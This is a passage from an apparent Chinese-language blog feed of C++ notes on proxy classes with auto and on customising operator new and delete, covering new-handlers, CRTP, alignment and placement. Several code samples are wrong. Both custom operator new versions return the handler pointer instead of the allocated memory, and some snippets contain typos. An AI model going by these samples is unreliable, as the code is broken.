class="hljs-title">features</span><span class="hljs-params">(<span class="hljs-type">const</span> Widget&amp; w)</span></span>;Widget w;<span class="hljs-type">bool</span> highPriority1 = <span class="hljs-built_in">features</span>(w)[<span class="hljs-number">5</span>];    <span class="hljs-comment">// 得到正确的 bool 变量</span><span class="hljs-keyword">auto</span> highPriority2 = <span class="hljs-built_in">features</span>(w)[<span class="hljs-number">5</span>];    <span class="hljs-comment">// 错误地得到了 std::vector&lt;bool&gt;::reference 对象</span></code></pre></div></div><p>除了<code>std::vector&lt;bool&gt;</code>以外，标准库中的智能指针和另外一些C++库中的类也使用了代理类的设计模式，例如为了提高数值计算代码效率的<strong>表达式模板</strong>技术：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-zk7xttlmyir35t"></i><span>cpp</span><div class="collapse show" id="collapse-zk7xttlmyir35t"><pre><code class="hljs cpp">Matrix sum = m1 + m2 + m3 + m4; <span class="hljs-comment">// 通过使 operator+ 返回结果的代理来提高效率</span></code></pre></div></div><blockquote><p>在实际编写代码时，记得通过查看文档或头文件中的函数原型来确认手头上的类是否为代理类。</p></blockquote><p>解决代理类问题的做法是：使用带显式类型的初始值设定项来强制<code>auto</code>推导出你想要的类型。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-wib74mlmyir35t"></i><span>cpp</span><div class="collapse show" id="collapse-wib74mlmyir35t"><pre><code class="hljs cpp"><span class="hljs-keyword">auto</span> highPriority = <span class="hljs-built_in">static_cast</span>&lt;<span class="hljs-type">bool</span>&gt;(<span class="hljs-built_in">features</span>(w)[<span class="hljs-number">5</span>]);</code></pre></div></div><p>这种用法并不仅限于会产生代理类型的初始值设定项，它同样可以应用于你想要强调创建一个类型不同于初始化表达式类型的场合，例如：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-z0zx7olmyir35t"></i><span>cpp</span><div class="collapse show" id="collapse-z0zx7olmyir35t"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">double</span> <span class="hljs-title">calcEpsilon</span><span class="hljs-params">()</span></span>;<span class="hljs-type">float</span> ep1 = <span class="hljs-built_in">calcEpsilon</span>();                      <span class="hljs-comment">// 进行从 double 到 float 的隐式类型转换</span><span class="hljs-keyword">auto</span> ep2 = <span class="hljs-built_in">static_cast</span>&lt;<span class="hljs-type">float</span>&gt;(<span class="hljs-built_in">calcEpsilon</span>());   <span class="hljs-comment">// 强调了类型转换的存在</span></code></pre></div></div><p>总结一下：</p><ul><li>不可见的代理类可能会使<code>auto</code>从表达式中推导出“错误的”类型</li><li>显式类型初始器惯用法强制<code>auto</code>推导出你想要的结果</li></ul>]]></content>
    
    
    <categories>
      
      <category>笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>EffectiveC++</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Effective C++ - Item49-52 - 定制new和delete</title>
    <link href="/posts/5982/"/>
    <url>/posts/5982/</url>
    
    <content type="html"><![CDATA[<h1 id="effective-c---item49-52---定制new和delete">Effective C++ -Item49-52 - 定制new和delete</h1><h3 id="总览">总览</h3><p>这一模块的内容是在完整阅读《Effective C++》的基础上，参考了<a href="https://www.zhihu.com/people/96-61-29-67">缪之灵</a>大佬的<a href="https://zhuanlan.zhihu.com/p/613356779">一篇文章学完 EffectiveC++：条款 &amp; 实践</a>进行总结。虽然<a href="https://www.zhihu.com/people/96-61-29-67">缪之灵</a>大佬的文章将最重要的部分总结的非常到位，但在此结合自己的理解和编程实践对其进行补充，并订正一些错误，以方便自己后续总结回顾，同时在尽可能保持简洁的前提下提高可读性。虽然原书有些地方写的比较拖沓，但作为经典的C++参考书，想要了解更多的细节，还是值得仔细去阅读的。</p><p>同时，假定阅读文章时对C++已经具有本科高级语言程序设计课程内容的理解水平。大部分情况下，除非它很重要，不会对C++基础的语法特性进行介绍。</p><p>本部分是第七章内容，对<strong>条款49-52</strong>进行介绍。</p><p>这一部分是对资源管理的延伸。其中条款16提到了成对使用new和delete时要采取相同形式。当我们为了各种目的（条款50）要自定义new和delete时，会发现有更多可能踩的坑，极有可能造成资源泄漏。这也非常考验我们C++的功力。因此虽然只有4个条款，但篇幅并不短。下面便对此进行详细的介绍，并穿插简略介绍现代C++有关内存管理的内容。</p><h3 id="条款-49了解-new-handler-的行为">条款 49：了解 new-handler的行为</h3><p>当<code>operator new</code>无法满足某一内存分配需求时，会不断调用一个客户指定的错误处理函数，即所谓的<strong>new-handler</strong>，直到找到足够内存为止，调用声明于<code>&lt;new&gt;</code>中的<code>set_new_handler</code>可以指定这个函数。<code>new_handler</code>和<code>set_new_handler</code>的定义如下：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-a0jmo4lmyiaxgh"></i><span>cpp</span><div class="collapse show" id="collapse-a0jmo4lmyiaxgh"><pre><code class="hljs cpp"><span class="hljs-keyword">namespace</span> std {    <span class="hljs-keyword">using</span> new_handler = <span class="hljs-built_in">void</span>(*)();    <span class="hljs-function">new_handler <span class="hljs-title">set_new_handler</span><span class="hljs-params">(new_handler)</span> <span class="hljs-title">throw</span> <span class="hljs-params">()</span></span>;    <span class="hljs-comment">// 返回值为原来持有的 new-handler</span>}</code></pre></div></div><blockquote><p>现代C++就不要再用<code>throw()</code>了（C++20已移除），用<code>noexcept</code>。后面代码也不会再写<code>throw()</code>了。</p></blockquote><p>当<code>operator new</code>无法满足内存申请时，它会<strong>不断</strong>调用<code>new-handler</code>函数，直到找到足够内存。</p><p>一个设计良好的 new-handler 函数必须做以下事情之一：</p><p><strong>让更多的内存可被使用：</strong>可以让程序一开始执行就分配一大块内存，而后当 <code>new-handler</code>第一次被调用，将它们释还给程序使用，造成<code>operator new</code>的下一次内存分配动作可能成功。</p><p><strong>设置另一个 new-handler：</strong> 如果目前这个<code>new-handler</code>无法取得更多内存，可以调换为另一个可以完成目标的<code>new-handler</code>。</p><p>具体的，调用<code>set_new_handler</code>，这样下一次调用<code>new_heandler</code>就可以做些不同的事。为了达到这个目的，可以让<code>new-handler</code> 修改“会影响 <code>new-handler</code>行为”的静态或全局数据。</p><p><strong>卸除 new-handler：</strong>将<code>nullptr</code>传给<code>set_new_handler</code>，这样会使<code>operator new</code>在内存分配不成功时抛出异常。</p><p><strong>抛出 bad_alloc（或派生自 bad_alloc）的异常：</strong>这样的异常不会被<code>operator new</code>捕捉，因此会被传播到内存分配处。</p><p><strong>不返回：</strong>通常调用<code>std::abort</code>或<code>std::exit</code>。</p><p>有的时候我们或许会希望在<strong>为不同的类分配对象时，使用不同的方式处理内存分配失败情况</strong>。这时候使用静态成员是不错的选择：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-erzvhzlmyiaxgh"></i><span>cpp</span><div class="collapse show" id="collapse-erzvhzlmyiaxgh"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Widget</span>{<span class="hljs-keyword">public</span>:    <span class="hljs-function"><span class="hljs-type">static</span> std::new_handler <span class="hljs-title">set_new_handler</span><span class="hljs-params">(std::new_handler p)</span> <span class="hljs-keyword">noexcept</span></span>;    <span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-type">void</span>* <span class="hljs-keyword">operator</span> <span class="hljs-title">new</span><span class="hljs-params">(std::<span class="hljs-type">size_t</span> size)</span></span>;<span class="hljs-keyword">private</span>:    <span class="hljs-type">static</span> std::new_handler currentHandler;};<span class="hljs-comment">// 做和 std::set_new_handler 相同的事情，将它获得的指针存储起来，然后返回先前(在此调用之前)存储的指针</span><span class="hljs-function">std::new_handler <span class="hljs-title">Widget::set_new_handler</span><span class="hljs-params">(std::new_handler p)</span> <span class="hljs-keyword">noexcept</span> </span>{    std::new_handler oldHandler = currentHandler;    currentHandler = p;    <span class="hljs-keyword">return</span> oldHandler; }<span class="hljs-function"><span class="hljs-type">void</span>* Widget::<span class="hljs-keyword">operator</span> <span class="hljs-title">new</span><span class="hljs-params">(std::<span class="hljs-type">size_t</span> size)</span> </span>{    std::new_handler globalHandler = std::<span class="hljs-built_in">set_new_handler</span>(currentHandler);  <span class="hljs-comment">// 切换至 Widget 的专属 new-handler,暂存原来的供后续恢复</span>    <span class="hljs-type">void</span>* ptr = ::<span class="hljs-keyword">operator</span> <span class="hljs-built_in">new</span>(size);                           <span class="hljs-comment">// 分配内存或抛出异常</span>    std::<span class="hljs-built_in">set_new_handler</span>(globalHandler);                        <span class="hljs-comment">// 切换回全局的 new-handler</span>    <span class="hljs-keyword">return</span> globalHandler;}std::new_handler Widget::currentHandler = <span class="hljs-literal">nullptr</span>;</code></pre></div></div><blockquote><p>看上去写的有点复杂，再理一下我们要干什么：我们要为<code>Widget</code>写一个其专属的<code>handler</code>，其行为和标准的<code>handler</code>一致，但只对<code>Widget</code>生效，而且只对下一次new生效。</p></blockquote><p><code>Widget</code>的客户应该类似这样使用其 new-handling：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-mpymcllmyiaxgh"></i><span>cpp</span><div class="collapse show" id="collapse-mpymcllmyiaxgh"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">OutOfMem</span><span class="hljs-params">()</span></span>{  std::cout&lt;&lt;<span class="hljs-string">"Custom handler when running out of memory!"</span>}Widget::<span class="hljs-built_in">set_new_handler</span>(OutOfMem);Widget* pw1 = <span class="hljs-keyword">new</span> Widget;              <span class="hljs-comment">// 若分配失败，则调用 OutOfMem</span>Widget::<span class="hljs-built_in">set_new_handler</span>(<span class="hljs-literal">nullptr</span>);Widget* pw2 = <span class="hljs-keyword">new</span> Widget;              <span class="hljs-comment">// 若分配失败，则抛出异常</span></code></pre></div></div><p>实现这一方案的代码并不因类的不同而不同，因此对这些代码加以复用是合理的构想。一个简单的做法是建立起一个“mixin”风格的基类，让其派生类继承它们所需的<code>set_new_handler</code>和<code>operator new</code>，并且使用模板确保每一个派生类获得一个实体互异的<code>currentHandler</code>成员变量：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-ny776glmyiaxgh"></i><span>cpp</span><div class="collapse show" id="collapse-ny776glmyiaxgh"><pre><code class="hljs cpp"><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> T&gt;<span class="hljs-keyword">class</span> <span class="hljs-title class_">NewHandlerSupport</span> {       <span class="hljs-comment">// “mixin”风格的基类</span><span class="hljs-keyword">public</span>:    <span class="hljs-function"><span class="hljs-type">static</span> std::new_handler <span class="hljs-title">set_new_handler</span><span class="hljs-params">(std::new_handler p)</span> <span class="hljs-keyword">noexcept</span></span>;    <span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-type">void</span>* <span class="hljs-keyword">operator</span> <span class="hljs-title">new</span><span class="hljs-params">(std::<span class="hljs-type">size_t</span> size)</span></span>;    ...                         <span class="hljs-comment">// 其它的 operator new 版本，见条款 52</span><span class="hljs-keyword">private</span>:    <span class="hljs-type">static</span> std::new_handler currentHandler;};<span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> T&gt;std::new_handler NewHandlerSupport&lt;T&gt;::<span class="hljs-built_in">set_new_handler</span>(std::new_handler p) <span class="hljs-keyword">noexcept</span> {    std::new_handler oldHandler = currentHandler;    currentHandler = p;    <span class="hljs-keyword">return</span> oldHandler;}<span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> T&gt;<span class="hljs-type">void</span>* NewHandlerSupport&lt;T&gt;::<span class="hljs-function"><span class="hljs-keyword">operator</span> <span class="hljs-title">new</span><span class="hljs-params">(std::<span class="hljs-type">size_t</span> size)</span> </span>{    std::new_handler globalHandler = std::<span class="hljs-built_in">set_new_handler</span>(currentHandler);    <span class="hljs-type">void</span>* ptr = ::<span class="hljs-keyword">operator</span> <span class="hljs-built_in">new</span>(size);    std::<span class="hljs-built_in">set_new_handler</span>(globalHandler);    <span class="hljs-keyword">return</span> globalHandler;}<span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> T&gt;std::new_handler NewHandlerSupport&lt;T&gt;::currentHandler = <span class="hljs-literal">nullptr</span>;<span class="hljs-comment">//使用</span><span class="hljs-keyword">class</span> <span class="hljs-title class_">Widget</span> : <span class="hljs-keyword">public</span> NewHandlerSupport&lt;Widget&gt; {<span class="hljs-keyword">public</span>:    ...                         <span class="hljs-comment">// 不必再声明 set_new_handler 和 operator new</span>};</code></pre></div></div><p>注意此处的模板参数<code>T</code>并没有真正被当成类型使用，而仅仅是用来区分不同的派生类，<strong>利用模板机制为每个派生类具现化出一份对应的<code>currentHandler</code></strong>。</p><p>这个做法用到了所谓的 <strong>CRTP（curious recurring templatepattern，奇异递归模板模式）</strong> 。</p><blockquote><p>C++的模版每具现化一次，都会生成其对应的具现化代码。通过上面的技巧写出的自定义handler代码，在<code>Widget</code>（或其他不同于<code>Widget</code>任何对象）的客户调用时，依旧可以直接使用<code>Widget::set_new_handler(OutOfMem);</code>。</p></blockquote><p>除了在上述设计模式中用到之外，它也被用于实现<strong>静态多态</strong>：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-0naj24lmyiaxgh"></i><span>cpp</span><div class="collapse show" id="collapse-0naj24lmyiaxgh"><pre><code class="hljs cpp"><span class="hljs-keyword">template</span> &lt;<span class="hljs-keyword">class</span> <span class="hljs-title class_">Derived</span>&gt; <span class="hljs-keyword">struct</span> <span class="hljs-title class_">Base</span> {    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Interface</span><span class="hljs-params">()</span> </span>{        <span class="hljs-built_in">static_cast</span>&lt;Derived*&gt;(<span class="hljs-keyword">this</span>)-&gt;<span class="hljs-built_in">Implementation</span>();      <span class="hljs-comment">// 在基类中暴露接口</span>    }};<span class="hljs-keyword">struct</span> <span class="hljs-title class_">Derived</span> : Base&lt;Derived&gt; {    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Implementation</span><span class="hljs-params">()</span></span>;                                  <span class="hljs-comment">// 在派生类中提供实现</span>};</code></pre></div></div><p>除了会调用 new-handler 的<code>operator new</code>以外，C++还保留了传统的“分配失败便返回空指针”的<code>operator new</code>，称为<code>nothrow new</code>，通过<code>std::nothrow</code>对象来使用它：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-h2dq0ylmyiaxgh"></i><span>cpp</span><div class="collapse show" id="collapse-h2dq0ylmyiaxgh"><pre><code class="hljs cpp">Widget* pw1 = <span class="hljs-keyword">new</span> Widget;                   <span class="hljs-comment">// 如果分配失败，抛出 bad_alloc</span><span class="hljs-keyword">if</span> (pw1 == <span class="hljs-literal">nullptr</span>) ...                     <span class="hljs-comment">// 这个测试一定失败</span>Widget* pw2 = <span class="hljs-built_in">new</span> (std::nothrow) Widget;    <span class="hljs-comment">// 如果分配失败，返回空指针</span><span class="hljs-keyword">if</span> (pw2 == <span class="hljs-literal">nullptr</span>) ...                     <span class="hljs-comment">// 这个测试可能成功</span></code></pre></div></div><p><code>nothrow new</code>对异常的强制保证性并不高，使用它只能保证<code>operator new</code>不抛出异常，而无法保证像<code>new (std::nothrow) Widget</code>这样的表达式不会导致异常，因此<strong>实际上并没有使用nothrow new 的需要</strong>。</p><h3 id="条款-50了解-new-和-delete-的合理替换时机">条款 50：了解 new 和delete 的合理替换时机</h3><p>以下是常见的替换默认<code>operator new</code>和<code>operator delete</code>的理由：</p><p><strong>用来检测运用上的错误：</strong> 如果将“new 所得内存”delete掉却不幸失败，会导致内存泄漏；如果在“new 所得内存”身上多次 delete则会导致未定义行为。</p><p>此外各式各样的编程错误可能导致<strong>“overruns”（写入点在分配区块尾端之后）</strong> 和<strong>“underruns”（写入点在分配区块起点之前）</strong>，以额外空间放置特定的byte pattern签名，检查签名是否原封不动就可以检测此类错误，下面给出了一个这样的范例：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-gpr0ejlmyiaxgh"></i><span>cpp</span><div class="collapse show" id="collapse-gpr0ejlmyiaxgh"><pre><code class="hljs cpp"><span class="hljs-type">static</span> <span class="hljs-type">const</span> <span class="hljs-type">int</span> signature = <span class="hljs-number">0xDEADBEEF</span>;              <span class="hljs-comment">// 调试“魔数”</span><span class="hljs-keyword">using</span> Byte = <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>;<span class="hljs-function"><span class="hljs-type">void</span>* <span class="hljs-keyword">operator</span> <span class="hljs-title">new</span><span class="hljs-params">(std::<span class="hljs-type">size_t</span> size)</span> </span>{    <span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;    <span class="hljs-type">size_t</span> realSize = size + <span class="hljs-number">2</span> * <span class="hljs-built_in">sizeof</span>(<span class="hljs-type">int</span>);         <span class="hljs-comment">// 分配额外空间以塞入两个签名</span>    <span class="hljs-type">void</span>* pMem = <span class="hljs-built_in">malloc</span>(realSize);                    <span class="hljs-comment">// 调用 malloc 取得内存</span>    <span class="hljs-keyword">if</span> (!pMem) <span class="hljs-keyword">throw</span> <span class="hljs-built_in">bad_alloc</span>();    <span class="hljs-comment">// 将签名写入内存的起点和尾端</span>    *(<span class="hljs-built_in">static_cast</span>&lt;<span class="hljs-type">int</span>*&gt;(pMem)) = signature;    *(<span class="hljs-built_in">reinterpret_cast</span>&lt;<span class="hljs-type">int</span>*&gt;(<span class="hljs-built_in">static_cast</span>&lt;Byte*&gt;(pMem) + realSize - <span class="hljs-built_in">sizeof</span>(<span class="hljs-type">int</span>))) = signature;    <span class="hljs-keyword">return</span> <span class="hljs-built_in">static_cast</span>&lt;Byte*&gt;(pMem) + <span class="hljs-built_in">sizeof</span>(<span class="hljs-type">int</span>);    <span class="hljs-comment">// 返回指针指向第一个签名后的内存位置</span>}</code></pre></div></div><p>实际上这段代码<strong>不能保证内存对齐</strong>，并且有许多地方不遵守C++ 规范，我们将在条款 51 中进行详细讨论。</p><blockquote><p>比如x86平台上int4字节，double8字节。尽管Intel x86上的doubles可被以任何byte边界对齐，但如果它是8-byte对齐，其访问速度会快许多。这个程序便不能保证。</p><p>所以作者还是认为有必要替换默认new和delete，但建议不要自己造轮子，可以根据需求看看已有的开源或者商业实现。</p></blockquote><p><strong>为了收集使用上的统计数据：</strong> 定制 new 和 delete动态内存的相关信息：分配区块的大小分布，寿命分布，FIFO（先进先出）、LIFO（后进先出）或随机次序的倾向性，不同的分配/归还形态，使用的最大动态分配量等等。</p><p><strong>为了增加分配和归还的速度：</strong>译器所带的<code>operator new</code>s和<code>operator delete</code>s需要考虑更多通用的因素。当定制的分配器专门针对某特定类型之对象设计时<strong>类专属的分配器可以做到“区块尺寸固定”</strong>，例如Boost 提供的 Pool程序库。又例如，编译器所带的内存管理器是线程安全的，但如果你的程序是单线程的，你也可以考虑写一个不线程安全的分配器来提高速度。当然，这需要你对程序进行分析，并确认程序瓶颈的确发生在那些内存函数身上。</p><p><strong>为了降低缺省内存管理器带来的空间额外开销：</strong>泛用型分配器往往（虽然并非总是）还比定制型分配器使用更多内存，那是因为它们常常在每一个分配区块身上导致某些额外开销。针对小型对象而开发的分配器（例如Boost 的 Pool 程序库）本质上消除了这样的额外开销。</p><p><strong>为了弥补缺省分配器中的非最佳内存对齐（suboptimalalignment）：</strong>上文例子已经讲过。<code>std::max_align_t</code>用来返回当前平台的最大默认内存对齐类型，对于<code>malloc</code>分配的内存，其对齐和<code>max_align_t</code>类型的对齐大小应当是一致的，但若对<code>malloc</code>返回的指针进行偏移，就没有办法保证内存对齐。&gt; 下面对现代C++中内存对齐的内容进行较深入讨论： &gt; &gt; 在 C++11中，提供了以下内存对齐相关方法： &gt; &gt; </p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-eicpmblmyiaxgh"></i><span>cpp</span><div class="collapse show" id="collapse-eicpmblmyiaxgh"><pre><code class="hljs cpp"><span class="hljs-comment">// alignas 用于指定栈上数据的内存对齐要求</span><span class="hljs-keyword">struct</span> <span class="hljs-title class_">alignas</span>(<span class="hljs-number">8</span>) testStruct { <span class="hljs-type">double</span> data; };<span class="hljs-comment">//ps：指定的必须是2的次幂，如果指定的次数大，超过下面提到的max_align_t，不一定能得到保证。这被叫做over-aligned。C++17对其进行了修复。</span><span class="hljs-comment">// alignof 和 std::alignment_of 用于得到给定类型的内存对齐要求</span>std::cout &lt;&lt; <span class="hljs-built_in">alignof</span>(std::<span class="hljs-type">max_align_t</span>) &lt;&lt; std::endl;std::cout &lt;&lt; std::alignment_of&lt;std::<span class="hljs-type">max_align_t</span>&gt;::value &lt;&lt; std::endl;<span class="hljs-comment">//通常等于double所占字节数</span><span class="hljs-comment">// std::align 用于在一大块内存中获取一个符合指定内存要求的地址</span><span class="hljs-keyword">struct</span> <span class="hljs-title class_">Arena</span> {  <span class="hljs-type">void</span>* ptr = <span class="hljs-number">0</span>;  std::<span class="hljs-type">size_t</span> size_remain = <span class="hljs-number">0</span>;    [[nodiscard]]  <span class="hljs-function"><span class="hljs-keyword">auto</span> <span class="hljs-title">aligned_alloc</span><span class="hljs-params">(std::<span class="hljs-type">size_t</span> alignment, std::<span class="hljs-type">size_t</span> size)</span> <span class="hljs-keyword">noexcept</span> -&gt; <span class="hljs-type">void</span>*</span><span class="hljs-function">  </span>{<span class="hljs-comment">//参数：期望的对齐方式，每个对齐单元大小，要对齐内存块的起始地址，要对齐内存块的大小；返回：内存块中满足对齐条件的指针，没有返回nullptr</span>    <span class="hljs-type">void</span>* res = std::<span class="hljs-built_in">align</span>(alignment, size, ptr, size_remain);    <span class="hljs-keyword">if</span> (res) {        ptr = <span class="hljs-built_in">static_cast</span>&lt;std::byte*&gt;(res) + size;        size_remain -= size;        <span class="hljs-keyword">return</span> res;    }    <span class="hljs-keyword">return</span> <span class="hljs-literal">nullptr</span>;  }};</code></pre></div></div> &gt; &gt;可以参考<a href="https://en.cppreference.com/w/cpp/memory/align">文档</a>。上面的案例取自<a href="https://lesleylai.info/zh/std-align/">AlignAllocator实现</a>，实际上现在C++17已经提供了<code>std::aligned_alloc</code>实现。&gt; &gt; 在 C++17后，可以使用<code>std::align_val_t</code>来重载需求额外内存对齐的<code>operator new</code>：&gt; &gt; <div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-v0t414lmyiaxgh"></i><span>cpp</span><div class="collapse show" id="collapse-v0t414lmyiaxgh"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">void</span>* <span class="hljs-keyword">operator</span> <span class="hljs-title">new</span><span class="hljs-params">(std::<span class="hljs-type">size_t</span> count, std::<span class="hljs-type">align_val_t</span> al)</span></span>;</code></pre></div></div> &gt;&gt;但是，这样必须同时重载与之配套的operatordelete。具体的，需要手动进行对象析构并且选择合适的带有对齐参数的delete。可以参见<a href="https://github.com/MeouSker77/Cpp17/blob/master/markdown/src/ch30.md">这里</a><p></p><p><strong>为了将相关对象成簇集中：</strong>如果你知道特定的某个数据结构往往被一起使用，而你又希望在处理这些数据时将“内存页错误（pagefaults）”的频率降至最低，那么可以考虑为此数据结构创建一个堆，将它们成簇集中在尽可能少的内存页上。一般可以使用placement new 达成这个目标（见条款 52）。</p><p><strong>为了获得非传统的行为：</strong>有时候你会希望<code>operator new</code>和<code>operator delete</code>做编译器版不会做的事情，例如分配和归还共享内存（sharedmemory），而这些事情只能被 C API 完成，则可以将 C API 封在 C++的外壳里，写在定制的 new 和 delete 中。</p><blockquote><p>这涉及到linux系统调用。</p></blockquote><h3 id="条款-51编写-new-和-delete-时需固守常规">条款 51：编写 new 和delete 时需固守常规</h3><p>我们在条款 49中已经提到过一些<code>operator new</code>的规矩，比如内存不足时必须不断调用new-handler，如果无法供应客户申请的内存，就抛出<code>std::bad_alloc</code>异常。C++还有一个奇怪的规定，即使客户需求为0字节，<code>operator new</code>也得返回一个合法的指针，这种看似诡异的行为其实是为了简化语言其他部分。</p><p>根据这些规约，我们可以写出非成员函数版本的<code>operator new</code>伪代码：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-1omlyjlmyiaxgh"></i><span>cpp</span><div class="collapse show" id="collapse-1omlyjlmyiaxgh"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">void</span>* <span class="hljs-keyword">operator</span> <span class="hljs-title">new</span><span class="hljs-params">(std::<span class="hljs-type">size_t</span> size)</span> </span>{    <span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;    <span class="hljs-keyword">if</span> (size == <span class="hljs-number">0</span>)      <span class="hljs-comment">// 处理0字节申请</span>        size = <span class="hljs-number">1</span>;       <span class="hljs-comment">// 将其视为1字节申请</span>    <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) {        <span class="hljs-keyword">if</span> (分配成功)            <span class="hljs-keyword">return</span> (一个指针，指向分配得到的内存)        <span class="hljs-comment">// 如果分配失败，调用目前的 new-handler</span>        <span class="hljs-keyword">auto</span> globalHandler = <span class="hljs-built_in">get_new_handler</span>(); <span class="hljs-comment">// since C++11</span>        <span class="hljs-keyword">if</span> (globalHandler) (*globalHandler)();        <span class="hljs-keyword">else</span> <span class="hljs-keyword">throw</span> std::<span class="hljs-built_in">bad_alloc</span>();    }}</code></pre></div></div><blockquote><p>在C++11之前，我们没有任何办法可以直接取得new-handling函数指针。只能这样：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-8xvzw9lmyiaxgh"></i><span>cpp</span><div class="collapse show" id="collapse-8xvzw9lmyiaxgh"><pre><code class="hljs cpp"><span class="hljs-keyword">new</span> handler globalHandler <span class="hljs-built_in">set_new_handler</span>(<span class="hljs-number">0</span>);<span class="hljs-built_in">set_new_handler</span>(globalHandler);</code></pre></div></div><p>这在多线程情况下可能出问题，必须加锁保证事务语义。</p></blockquote><p>上面的伪代码可以看做对条款49的具体遵循。</p><p><code>operator new</code>的成员函数版本一般只会分配大小刚好为类的大小的内存空间，但是情况并不总是如此，比如假设我们没有为派生类声明其自己的<code>operator new</code>，那么派生类会从基类继承<code>operator new</code>，这就导致派生类使用的是基类的new 分配方式，但派生类和基类的大小很多时候是不同的。</p><blockquote><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-4d87gilmyiaxgh"></i><span>cpp</span><div class="collapse show" id="collapse-4d87gilmyiaxgh"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Base</span>{<span class="hljs-keyword">public</span>:    <span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-type">void</span>* <span class="hljs-keyword">operator</span> <span class="hljs-title">new</span><span class="hljs-params">(std:size t size)</span><span class="hljs-title">throw</span><span class="hljs-params">(std::bad alloc)</span></span>;...}<span class="hljs-keyword">class</span> <span class="hljs-title class_">Derived</span>:<span class="hljs-keyword">public</span> Base {...};<span class="hljs-comment">//假设Derived未声明operator new</span>Derived* p <span class="hljs-keyword">new</span> Derived; <span class="hljs-comment">//这里调用的是Base::operator new</span></code></pre></div></div></blockquote><p>处理此情况的最佳做法是将“内存申请量错误”的调用行为改为采用标准的<code>operator new</code>：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-9nljkmlmyiaxgh"></i><span>cpp</span><div class="collapse show" id="collapse-9nljkmlmyiaxgh"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">void</span>* Base::<span class="hljs-keyword">operator</span> <span class="hljs-title">new</span><span class="hljs-params">(std::<span class="hljs-type">size_t</span> size)</span> <span class="hljs-title">throw</span><span class="hljs-params">(std::bad_alloc)</span></span>{    <span class="hljs-keyword">if</span> (size != <span class="hljs-built_in">sizeof</span>(Base))        <span class="hljs-keyword">return</span> ::<span class="hljs-keyword">operator</span> <span class="hljs-built_in">new</span>(size);    <span class="hljs-comment">// 转交给标准的 operator new 进行处理</span>    ...}</code></pre></div></div><p>注意在<code>operator new</code>的成员函数版本中我们也不需要检测分配的大小是否为0了，因为在条款39中提到过，非附属对象必须有非零大小，所以<code>sizeof(Base)</code>无论如何也不能为0。</p><p>如果你打算实现<code>operator new[]</code>，即所谓的 arraynew，那么你唯一要做的一件事就是分配一块未加工的原始内存，因为你无法对array 之内迄今尚未存在的元素对象做任何事情，实际上你甚至无法计算这个array 将含有多少元素对象，在多态的情境下更是如此。</p><blockquote><p>在More Effective C++条款3中提到，绝对不要以多态(polymorphically)方式处理数组。对此情况进行了进一步的解释。</p></blockquote><p><code>operator delete</code>的规约更加简单，你需要记住的唯一一件事情就是C++ 保证 <strong>“删除空指针永远安全”</strong>：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-q1roc9lmyiaxgh"></i><span>cpp</span><div class="collapse show" id="collapse-q1roc9lmyiaxgh"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-keyword">operator</span> <span class="hljs-title">delete</span><span class="hljs-params">(<span class="hljs-type">void</span>* rawMemory)</span> <span class="hljs-keyword">noexcept</span> </span>{  <span class="hljs-comment">//如果被删除的是null指针，什么也不用做</span>    <span class="hljs-keyword">if</span> (rawMemory == <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span>;    <span class="hljs-comment">// 归还 rawMemory 所指的内存</span>}</code></pre></div></div><p><code>operator delete</code>的成员函数版本要多做的唯一一件事就是将大小有误的删除行为转交给标准的<code>operator delete</code>：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" 